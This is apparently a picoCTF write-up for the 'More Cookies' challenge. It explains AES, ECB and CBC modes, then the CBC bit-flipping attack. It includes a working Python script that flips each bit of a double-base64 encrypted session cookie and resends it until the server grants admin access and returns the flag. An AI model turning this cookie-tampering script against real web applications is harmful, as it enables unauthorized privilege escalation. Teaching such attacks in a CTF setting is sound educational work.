* **We are presented with the following web page :**
<figure><center><img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/main/2022-09-12%2021_54_07-More%20Cookies%20%E2%80%94%20Mozilla%20Firefox.png"></center><center><em><figcaption>http://mercury.picoctf.net:34962/</figcaption></em></center></figure>

* **Since the challenge title refers to ```Cookies```, let's check if there are some :**

```shell
auth_name = L2M0a3lRaUd2bGNCcytsREhNTUNzSjhqQlQ3djljUCszeGl5RFlFdWlTQlc5b0c5ZW1IZzcvejZoeHBmeGNGOFpZRTdSUzFZMHR2eElhMnNXMi9IbHVBdTBVdE04T3hFbzZQcWlmQlVGQnZoWFhGVGRaWTQ2TnUzbVE4d1gxL0U= 
```

* **We have a cookie called ```auth_name``` which seems to be ```base64``` encoded.**
* **Let's ```base64``` decode it using ```Cyberchef``` :**
<figure><center><img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/main/2022-09-12%2022_06_06-HACKING_MACHINE%20-%20VMware%20Workstation%2016%20Player%20(Non-commercial%20use%20only).png"></center><center><em><figcaption>CyberChef</figcaption></em></center></figure>

* **As you can see, the result also seems to be ```base64``` encoded :**
* **Let's try decoding it one more time :**

* **This time, we have some gibberish, unreadable piece of text.**
* **This indicates that the ```cookie``` was ```encrypted```, as per the challenge description, and ```base64``` encoded twice**

* **After taking a look af the first hint, which is a <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption" target="_blank"><er>Wikipedia link</er></a>, i realized that we are dealing with ```homomorphic encryption```.**

## **<strong><font color="Brown">Homomorphic Encryption</font></strong>**
***
> ***As Per Wikipedia, <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption" target="_blank"><er>Homomorphic Encryption</er></a> is a form of encryption that permits users to perform computations on encrypted data without first decrypting it.***

***

* ***Basically, ```Homomorphic Encryption``` makes it possible to analyze and manipulate encrypted data without the need to decipher it and revealing private information.***
* ***To better understand the concept, let's take the example of a person asking the location of a specific restaurant from a third party service.***
* ***This person is actually revealing a huge volumes of data (His current location, the fact that he wants a restaurant, what time it is and more ...) with the service provider that's going to locate for him the requested restaurant.***
* ***However, if ```homomorphic encryption``` was applied in this example, none of the revealed informations would be visible to the service provider such as Google.***

***

* **With that being said, we need to find a way to manipulate the cookie without decrypting it in order to become an ```admin``` user.**
* **Another thing worth mentioning is that, if you take a closer look at the <a href="https://younestasra-r4z3rsw0rd.github.io/posts/MoreCookies/#description"><er>Challenge Description</er></a>, you will notice that the letters ```C```, ```B``` and ```C``` are strangely capitalized, which is an indication that ```CBC``` or ```Cipher Block Chaining``` is the encryption scheme used to encrypt the ```Cookie```.**

## **<strong><font color="Brown">Back to Basics </font></strong>**
***
* **Before we can start tackling this problem, itâ€™s worth revisiting how ```Cipher Block Chaining (CBC)``` works as we will need to understand how the algorithm operates in order to take on some advanced stuff.**
* **Let's start by defining some ```cryptographic algorithms``` :**s

### **<strong><font color="DarkCyan">AES</font></strong>**
* **AES, short for Advanced Encryption Standard, is a ```128-bit symmetric bloc cipher```, which means that it takes 128 bits of plaintext and encrypts it into 128 bits of ciphertext with a key that can either be ```128```, ```192``` or ```256``` bits.**
* **AES comes with plenty of different ```modes```, all labeled with a 3 letters names such as ```ECB``` (Electronic Code Book), ```CBC``` (Cipher Block Chaining), ```CTR``` (Counter) or ```CFB``` (Cipher Feedback) and more.**

***

### **<strong><font color="DarkCyan">Block Cipher</font></strong>**
* **A block cipher is a ```symmetric cryptographic algorithm``` that takes a plaintext block of length *n* and a key, and use that to generate a ciphertext block of the same length *n*.**
* **```AES``` is the most popular ```block cipher```, as i mentioned earlier it operates on ```128-bit blocks``` with keys of ```128```, ```192``` or ```156``` bits.**
* **The problem here is that, if you have a file of ```2GB``` and you are working with a ```128-bit``` block cipher (AES for example), the algorithm is certainly not going to encrypt this large file in a single call.** 
* **This is where ```modes of operation``` comes into play.**

***

### **<strong><font color="DarkCyan">ECB</font></strong>**
* **```ECB```, or ```Electronic Codebook```, is one of the solutions provided to overcome this problem.** 
* **The idea is to divide the data (plaintext) into multiple blocks and each block is encrypted separately using a block cipher algorithm with the same key.**
<figure><center><img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/main/picoctf1.png"></center><center><em><figcaption>Electronic Codebook (ECB) mode</figcaption></em></center></figure>

* **The problem with ```ECB``` mode is that encrypting the same block of plaintext always yields the same block of ciphertext.**
* **This can allow the attacker to detect whether two ```ECB``` encrypted messages are identical, or share a common prefix or substrings.** 
* **Additionally, ```ECB mode``` is not ```semantically secure```, which means that observing ```ECB``` encrypted ciphertext can leak informations about the plaintext.**
* **Let's take for example the following graphical demonstration i found on Wikipedia, where the same image is encrypted using both ```ECB``` mode and a ```semantically secure``` cipher mode like ```CBC```:**
<figure><center><img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/main/ECB%20Pinguin.png"></center><center><em><figcaption>ECB Penguin</figcaption></em></center></figure>

***

### **<strong><font color="DarkCyan">CBC</font></strong>**

* **In ```CBC``` mode, each block of plaintext is <a href="https://en.wikipedia.org/wiki/XOR" target="_blank"><er>XORed</er></a> with the previous ciphertext block before being encrypted.**
* **In other words, ```CBC``` mode links the output of one block to the input of the next block, which essentially ```randomise``` the encryption and hence generate distinct ciphertexts even if the same plaintext is encrypted multiple times.**
* **For the first block, we use something called an ```Initialization Vector``` (IV), which is nothing more than a ```random array of bytes``` that has the same length of the blocks.**
<br/>
<figure><center><img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/main/CBC%20Encrypt.png"></center><center><em><figcaption>Cipher Block Chaining (CBC) mode Encryption</figcaption></em></center></figure>

***

* **```Decryption``` works by doing the process in ```reverse```.**
* **As you can see in the representation below, the first ciphertext block is decrypted using the decryption key *(which is the same key used for encryption since we are working with symmetric encryption)* and XORing the result with the ```Initialization Vector``` (IV), which gives us the first plaintext block.**
* **Now, moving to the next block, we decrypt the second ciphertext block and ```XOR``` the result with the previous ciphertext block which gives us the second plaintext block**
* **And So On ...**
<figure><center><img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/main/CBC%20Decrypt.png"></center><center><em><figcaption>Cipher Block Chaining (CBC) mode Decryption</figcaption></em></center></figure>

## **<strong><font color="Brown">Bit-Flipping Attack</font></strong>**

***

* **Now that we understand how ```CBC``` works, we can now talk about ```Bit-Flipping``` attack.**
* **The main vulnerable part of ```CBC``` is that, it relies on the previous ciphertext block in order to encrypt/decrypt the next plaintext/ciphertext block, and this is exactly where the ```Bit-Flipping``` attack comes into play.**
* **Let's see the visual representation of this attack in order to better understand how it works :**
<figure><center><img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra.github.io_Img/main/Bit-Flipping.png"></center><center><em><figcaption>CBC Bit-Flipping Attack</figcaption></em></center></figure>

* **As you can see, a <font color="Red">1-bit error</font> in the second ciphertext block :**
    * **Completely scambles the <font color="Red">plaintext block</font> which has the same index as the modified ciphertext;**
    * **AND Generates the same <font color="Red">1-bit error</font> in the next plaintext block (Third block).**

* **For example, in order to flip the <font color="Red">first bit</font> of the ```third plaintext block```, we need to flip the <font color="Red">first bit</font> of the ```second ciphertext block```.**

## **<strong><font color="Brown">Exploitation</font></strong>**
***
* **Now that we have gone through the basics, let's try to solve the challenge.**
* **Since the challenge description highlights the use of ```AES-CBC mode``` to encrypt the ```auth_name``` cookie, we can assume that there is a ```bit```, within the encrypted cookie, responsible of identifying admin users from normal users.**
* **There is most likely a ```parameter``` like ```admin=0``` and if we modify the ```proper bit```, we can modify this parameter and set it to ```1```.**
<br/>

* **The problem is that the position of this particular bit is unkown, which means we need to try every single position and ```flip``` every single bit until the ```flag``` is shown.**
* **To do so, let's write a ```Python Script``` that will loop over all the bits in the ```cookie``` and flips each one until the ```flag``` is displayed.**

### **<strong><font color="DarkCyan">Writing the exploit</font></strong>**

* **First things first, let's :**
> 1. Establish a ```session object``` using the ```requests``` module;
> 2. Send a ```GET``` request;
> 3. Grab the ```auth_name``` cookie and store it in a ```Cookie``` variable;
> 4. ```Base64 decode``` twice the cookie. 

```python
#!/usr/bin/python3

import requests
from base64 import *

Target = "http://mercury.picoctf.net:34962/"   # CHANGE THIS

# Create a session object :
session = requests.Session()

# Make a GET request :
session.get(Target)

# Storing the auth_name cookie in our Cookie variable :
Cookie = session.cookies["auth_name"]

# Base64 decode twice :
Raw_Cookie = b64decode(b64decode(Cookie))

```

* **At this point, if we print out ```Cookie``` and ```Raw_Cookie```, we get the following :**

```shell
Cookie: MEZJZWc5UGdIeUZqdVNMNGx0WXBiYk42WDBWSThaUW9hcW5zYjEzN2I2ckgyZVpTbG1wenRVbVNDb1VreG4xNHJOMExEL2Q2NTY5aEZpNlRGMndLMUVOL3d4cmxRRkhUS2Y0QTcxaWJPSVlseGU1d2NjS1VQakZzZUNheU82Rmk=
Raw_Cookie: b'\xd0R\x1e\x83\xd3\xe0\x1f!c\xb9"\xf8\x96\xd6)m\xb3z_EH\xf1\x94(j\xa9\xeco]\xfbo\xaa\xc7\xd9\xe6R\x96js\xb5I\x92\n\x85$\xc6}x\xac\xdd\x0b\x0f\xf7z\xe7\xafa\x16.\x93\x17l\n\xd4C\x7f\xc3\x1a\xe5@Q\xd3)\xfe\x00\xefX\x9b8\x86%\xc5\xeepq\xc2\x94>1lx&\xb2;\xa1b'
```

* **Now, let's write the ```exploit``` where the ```Bit-Flipping``` process is going to take place.**
> 1. First, we define a ```loop``` to iterate over ```every single byte``` in the ```Raw_Cookie```;
> 2. Then, we define another nested ```loop``` to iterate over ```every single bit``` in the current byte of every iteration, given that every byte contains 8 bits ```(1-Byte = 8-bits)```;
> 3. Then, we take ```every byte of every iteration``` and ```xor``` it with ```another byte``` where all bits are set to ```zero``` except the bit at the position 'bit_index' which going to be set to ```one```;
> 4. ```Base64``` encode twice the generated cookie from the 3rd step;
> 5. Send a ```GET request``` with the new cookie; 
> 6. Checking if the flag is displayed in the response; 
>>  1. If  so, printing out the ```flag```, considering that the it is located between ```<code>``` and ```</code>``` HTML elements.
>>  2. Move on to the next byte and ```REPEAT```.

***

* **Here is what our first and basic script will look like :**

```python
#!/usr/bin/python3

import requests
from base64 import *

Target = "http://mercury.picoctf.net:34962/"        # CHANGE THIS

# Create a session object :
session = requests.Session()

# Make a GET request :
session.get(Target)

# Storing the auth_name cookie in our Cookie variable :
Cookie = session.cookies["auth_name"]

# Base64 decode twice :
Raw_Cookie = b64decode(b64decode(Cookie))

# Iterate over every single byte in the Raw_Cookie :
for byte_index in range(len(Raw_Cookie)) :

	# Iterate over every single bit in the current byte at the position "byte_index" => 1-Byte = 8-bits :
	for bit_index in range(0,8) :
		Potential_Raw_Cookie = Raw_Cookie[0:byte_index] + (Raw_Cookie[byte_index] ^ (1 << bit_index)).to_bytes(1, 'big') + Raw_Cookie[byte_index+1 :]
				
		# Base64 encode twice the Potential_Raw_Cookie to send out the Potential_Cookie in the same encoding scheme:
		Potential_Cookie = b64encode(b64encode(Potential_Raw_Cookie)).decode()	

		# Sending a GET request with the Potential_Cookie :
		r = requests.get(Target, cookies={"auth_name": Potential_Cookie})

		# Cheking if the response contains our flag format "picoCTF{" : 
		if ('picoCTF{' in r.text) :

			print("\n[*] HERE IS YOUR FLAG: " + r.text.split("<code>")[1].split("</code>")[0])
			exit()

# Clarification of the Potential_Raw_Cookie variable : +------------------------------------------------------------------------------------------+

		# Raw_Cookie[0:byte_index] 	 => All bytes before the current "byte_index", will not be engaged in the Bit-Flipping process, as they have already been tested.
		# Raw_Cookie[byte_index]   	 => This is the current byte where the Bit-Flipping is taking place.
		# 1 << bit_index           	 => This is the byte we created in order to xor it with the current byte, which is Raw_Cookie[byte_index]

			# if (bit_index == 0) then ( 1 << bit_index ) == 0000 0001 => 1
			# if (bit_index == 1) then ( 1 << bit_index ) == 0000 0010 => 2
			# if (bit_index == 2) then ( 1 << bit_index ) == 0000 0100 => 4
			# ...
			# if (bit_index == 7) then ( 1 << bit_index ) == 1000 0000 => 128
			
		# to_bytes(1, 'big')      	 => This will transfrom the XOR result into a raw format
		#            		  	 => For example, if the XOR result is 73 then to_bytes() will return b'\xe5'
		
		# Raw_Cookie[byte_index+1 :]	 => All bytes after the current "byte_index", will NOT YET be engaged in the Bit-Flipping process.	
#-------------------------------------------------------------------------------------------------------------------------------------------------+

```
* **The above script is very basic and simple, i wrote an improved and more verbose version, which walks you through the ```Bit-Flipping``` process and tells you where exactly it is taking place and makes you better understand the attack.**
